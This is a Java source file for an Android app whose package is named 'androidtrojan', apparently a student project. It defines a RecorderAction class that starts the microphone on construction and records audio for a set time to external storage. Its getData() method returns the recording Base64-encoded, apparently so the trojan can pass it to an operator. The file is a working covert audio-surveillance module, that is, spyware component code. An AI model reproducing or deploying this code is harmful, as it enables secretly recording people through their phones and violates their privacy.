package il.ac.colman.androidtrojan.Actions;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.Date;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.os.CountDownTimer;
import android.os.Environment;
import android.util.Base64;
import android.util.Log;

public class RecorderAction implements ATAction {
	// class fields:
	private static final String LOG_TAG = "AudioRecordTest";
	private static String _fileName = null;
	private String _file = null;
	private String _path = null;
	private MediaRecorder _recorder = null;
	private MediaPlayer _player = null;
	private int _time;
	private boolean _check = false;//to check if it is o.k to send the data

	//ctor:
	public RecorderAction(int _time) {
		//setting the name of the file:
		this.setFileName(); // sets the file name by pattern.

		//setting the time:
		this._time = _time;

		//recording:
		record();
	}

	//recorder method:
	private void record(){
		// start recording on service start:
		startRecording(); // start recording.
		// Before we stop recording, we will count 30 seconds:
		CountDownTimer myTimer = new CountDownTimer(_time, 1000) {

			@Override
			public void onTick(long millisUntilFinished) {
				// TODO Auto-generated method stub
				// doing nothing
			}

			@Override
			public void onFinish() {
				// TODO Auto-generated method stub
				stopRecording(); // stop recording.
				
				//setting the check to true - o.k to send the file:
				_check = true;
			}
		};
		// starting the timer:
		myTimer.start();
	}

	//methods:
	protected void startPlaying() {
		_player = new MediaPlayer();
		try {
			_player.setDataSource(_fileName);
			_player.prepare();
			_player.start();
		} catch (IOException e) {
			Log.e(LOG_TAG, "prepare() failed");
		}
	}

	protected void stopPlaying() {
		_player.release();
		_player = null;
	}

	private void startRecording() {
		_recorder = new MediaRecorder();
		_recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
		_recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
		_recorder.setOutputFile(_fileName);
		_recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);

		try {
			_recorder.prepare();
		} catch (IOException e) {
			Log.e(LOG_TAG, "prepare() failed");
		}

		_recorder.start();
	}

	private void stopRecording() {
		_recorder.stop();
		_recorder.release();
		_recorder = null;
	}

	private void setFileName() {
		_path = Environment.getExternalStorageDirectory().getAbsolutePath();
		Date myDate = new Date();
		_file = "audiorecord" + myDate.getTime() + ".3gp";
		_fileName = _path + "/" + _file;
	}

	// getters of the addresses:
	public String get_file() {
		return _file;
	}

	public String get_path() {
		return _path;
	}
	
	public boolean is_finishedRecording() {
		return _check;
	}

	@Override
	public String getData() {
		// TODO Auto-generated method stub
		if(_check)
		{
			File file = new File( this.get_path() + "/" + this.get_file());
			byte[] bFile = new byte[(int) file.length()];
			try {
				FileInputStream fileInputStream = new FileInputStream(file);
				fileInputStream.read(bFile);
				fileInputStream.close();
				String encoded = Base64.encodeToString(bFile, 0);
				
				//returning the file in base64 codding:
				return encoded;
			} catch (IOException e) {
				e.printStackTrace();
			}			
		}
		
		//else:
		return null;
	}
}